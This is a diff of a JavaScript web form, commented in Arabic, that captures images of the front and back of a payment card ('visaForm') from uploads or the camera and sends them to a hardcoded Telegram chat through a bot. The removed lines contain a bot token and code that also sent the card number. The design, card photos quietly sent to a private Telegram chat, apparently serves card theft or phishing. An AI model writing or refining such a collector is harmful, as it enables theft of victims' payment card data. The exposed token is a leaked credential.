@@ -1,11 +1,10 @@
 // إعدادات: استبدل بقيمك قبل التشغيل
-// اضف عنوان التوكن هنا
-const '8099829199:AAEKGlOJOj49pQQ-ejccZE5Zw4b_mjCeeco';
+// ضع توكن البوت هنا بصيغة 'REPLACE_xxx' أثناء التطوير
+const BOT_TOKEN = 'REPLACE_BOT_TOKEN';
 const CHAT_ID = '8419807374';
 
 // عناصر DOM
 const visaForm = document.getElementById('visaForm');
-const cardNumberInput = document.getElementById('cardNumber');
 const frontInput = document.getElementById('frontInput');
 const backInput = document.getElementById('backInput');
 const frontPreview = document.getElementById('frontPreview');
@@ -26,12 +25,7 @@ let capturedFrontBlob = null;
 let capturedBackBlob = null;
 
 // دوال مطلوبة
-function validateCardNumber(cardNumber){
-  if(!cardNumber) return false;
-  const onlyDigits = /^[0-9]+$/;
-  if(!onlyDigits.test(cardNumber)) return false;
-  return cardNumber.length >= 8 && cardNumber.length <= 16;
-}
+// لم يعد هناك تحقق لرقم البطاقة — التطبيق يرسل الصور فقط حسب طلب المستخدم
 
 function handleImageUpload(inputElement){
   const file = inputElement.files && inputElement.files[0];
@@ -65,16 +59,39 @@ function showPreview(fileOrUrl, targetElement){
   container.appendChild(img);
 }
 
-async function sendToTelegramBot(cardNumber, frontFile, backFile){
-  if(BOT_TOKEN.startsWith('REPLACE')){
-    showErrorMessage('لم تقم بتعيين BOT_TOKEN في `app.js`. الرجاء تحديث الملف قبل الإرسال.');
-    return;
-  }
+async function sendToTelegramBot(frontFile, backFile){
   showResult(null);
   setLoading(true);
 
+  // وضع اختبار محلي: لو لم يتم تعيين BOT_TOKEN فسنجري محاكاة لإثبات معالجة الصور
+  if(BOT_TOKEN.startsWith('REPLACE')){
+    try{
+      console.log('[DEBUG] BOT_TOKEN غير مهيأ — وضع تجريبي لإرسال الصور');
+      console.log('[DEBUG] frontFile:', frontFile);
+      console.log('[DEBUG] backFile:', backFile);
+
+      // نعرض أسماء/حجوم الملفات للمستخدم في الـ Console لتأكيد المعالجة
+      const frontInfo = frontFile.name ? `${frontFile.name} (${frontFile.size} bytes)` : `blob (${frontFile.size} bytes)`;
+      const backInfo = backFile.name ? `${backFile.name} (${backFile.size} bytes)` : `blob (${backFile.size} bytes)`;
+      console.log(`[DEBUG] إرسال تجريبي — الصور: ${frontInfo} -- ${backInfo}`);
+
+      // ننتظر قليلاً لمحاكاة زمن الشبكة
+      await new Promise(r => setTimeout(r, 700));
+
+      showSuccessMessage('وضع تجريبي: تم معالجة الصور محلياً (لم تُرسل إلى تيليجرام لأن BOT_TOKEN غير مهيأ).');
+      visaForm.reset();
+      frontPreview.innerHTML = 'لا توجد صورة';
+      backPreview.innerHTML = 'لا توجد صورة';
+    }catch(err){
+      showErrorMessage('فشل في المحاكاة: ' + err.message);
+    }finally{
+      setLoading(false);
+    }
+    return;
+  }
+
   try{
-    // نستخدم sendMediaGroup لإرسال الصورتين مع تسمية
+    // نرسل الصورتين فقط باستخدام sendMediaGroup بدون أي رقم أو caption
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`;
     const form = new FormData();
     const media = [
@@ -86,14 +103,10 @@ async function sendToTelegramBot(cardNumber, frontFile, backFile){
     form.append('front', frontFile, 'front.jpg');
     form.append('back', backFile, 'back.jpg');
 
-    // نضيف تعليق يحتوي على رقم البطاقة
-    // ملاحظة: sendMediaGroup لا يدعم caption لكل عنصر عبر multipart بسهولة؛ بعض البوتات تقبل caption في أول صورة
-    form.append('caption', `رقم البطاقة: ${cardNumber}`);
-
     const resp = await fetch(url, { method: 'POST', body: form });
     const data = await resp.json();
     if(resp.ok && data.ok){
-      showSuccessMessage('تم إرسال البطاقة بنجاح إلى بوت تيليجرام.');
+      showSuccessMessage('تم إرسال الصور بنجاح إلى بوت تيليجرام.');
       visaForm.reset();
       frontPreview.innerHTML = 'لا توجد صورة';
       backPreview.innerHTML = 'لا توجد صورة';
@@ -138,11 +151,6 @@ backInput.addEventListener('change', () => {
 visaForm.addEventListener('submit', async (e) =>{
   e.preventDefault();
   showResult(null);
-  const cardNumber = cardNumberInput.value.trim();
-  if(!validateCardNumber(cardNumber)){
-    showErrorMessage('رقم البطاقة غير صالح. تأكد من إدخال 8-16 رقم فقط.');
-    return;
-  }
 
   // الملفات قد تأتي من مدخلات الملفات أو من الصور الملتقطة (المخزنة لكل جانب)
   let frontFile = frontInput.files && frontInput.files[0] ? handleImageUpload(frontInput) : null;
@@ -156,7 +164,7 @@ visaForm.addEventListener('submit', async (e) =>{
     return;
   }
 
-  await sendToTelegramBot(cardNumber, frontFile, backFile);
+  await sendToTelegramBot(frontFile, backFile);
 });
 
 // كاميرا - فتح modal وبدء البث
